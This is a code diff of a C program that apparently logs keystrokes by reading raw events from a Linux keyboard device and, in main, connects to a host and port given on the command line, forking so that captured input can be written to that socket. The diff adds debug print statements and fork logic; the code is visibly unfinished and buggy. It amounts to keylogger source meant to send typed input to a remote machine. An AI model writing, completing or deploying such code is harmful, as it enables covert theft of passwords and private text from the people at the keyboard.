@@ -38,11 +38,11 @@ char* convertEventCode(uint16_t code, int shifted){
    
 }
 
-char* getInput(void){
+void getInput(char *value){
   struct input_event event;
   int fd,rd, shift = 0;
   uid_t pid;
-  char *value;
+  //char *value;
   pid = getuid();
    
   if(pid!=0){
@@ -79,7 +79,7 @@ char* getInput(void){
       size = read(fd,&event,sizeof(event));
   }
   //fclose(log);
-  return value;
+  //return value;
   printf("errno = %d\n",errno);
 }
 
@@ -91,15 +91,17 @@ void error(const char *msg)
 
 int main(int argc, char *argv[])
 {
+	printf("first\n ");
     int sockfd, portno, n;
     struct sockaddr_in serv_addr;
     struct hostent *server;
-
+    pid_t childPID;
     char buffer[256];
     if (argc < 3) {
        fprintf(stderr,"usage %s hostname port\n", argv[0]);
        exit(0);
     }
+printf("second\n ");
     portno = atoi(argv[2]);
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
@@ -109,26 +111,38 @@ int main(int argc, char *argv[])
         fprintf(stderr,"ERROR, no such host\n");
         exit(0);
     }
+printf("third\n ");
     bzero((char *) &serv_addr, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     bcopy((char *)server->h_addr, 
          (char *)&serv_addr.sin_addr.s_addr,
          server->h_length);
     serv_addr.sin_port = htons(portno);
+printf("fourth\n ");
     if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
         error("ERROR connecting");
+printf("fifth\n ");
     printf("Please enter the message: ");
     bzero(buffer,256);
+    childPID = fork();// creating a child process
+printf("fork \n ");
+    if(childPID >=0)// fork was successful
+    {
+		if(childPID ==0) //child process
+		{		
     //fgets(buffer,255,stdin);
-    buffer = getInput();
-    n = write(sockfd,buffer,strlen(buffer));
-    if (n < 0) 
-         error("ERROR writing to socket");
-    bzero(buffer,256);
-    n = read(sockfd,buffer,255);
-    if (n < 0) 
-         error("ERROR reading from socket");
-    printf("%s\n",buffer);
+    		getInput(buffer);
+		}else{
+    		n = write(sockfd,buffer,strlen(buffer));
+    		if (n < 0) 
+         		error("ERROR writing to socket");
+    		bzero(buffer,256);
+    		n = read(sockfd,buffer,255);
+    		if (n < 0) 
+         		error("ERROR reading from socket");
+    		printf("%s\n",buffer);
+		}
+	}
     close(sockfd);
     return 0;
 }
